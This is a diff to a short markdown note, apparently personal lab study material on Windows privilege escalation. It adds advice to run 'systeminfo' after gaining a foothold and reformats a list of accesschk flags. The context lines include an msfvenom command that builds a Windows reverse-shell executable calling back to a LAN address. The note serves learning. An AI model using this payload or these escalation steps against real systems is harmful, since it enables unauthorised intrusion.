@@ -13,6 +13,14 @@ Generating reverse shell using msfvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.158.146 LPORT=53 -f exe -o reverse.exe
 ```
 
+Once you get an intial foothold, always look for information about the os
+
+```cmd
+systeminfo 
+```
+Using this we can think about an escalation strategy
+
+
 Permissions to access a certain resource in Windows are
 controlled by the access control list (ACL) for that resource.
 Each ACL is made up of zero or more access control entries
@@ -37,12 +45,12 @@ sc qc  daclsvc
 ```
 Using accesschk.exe
 
--u Suppress errors
--v Verbose 
--c Windows service
--d Only process directories or top-level keys
--w Show objects which have right access 
--q Omit banner
+- -u Suppress errors
+- -v Verbose 
+- -c Windows service
+- -d Only process directories or top-level keys
+- -w Show objects which have right access 
+- -q Omit banner
 
 
 ```cmd
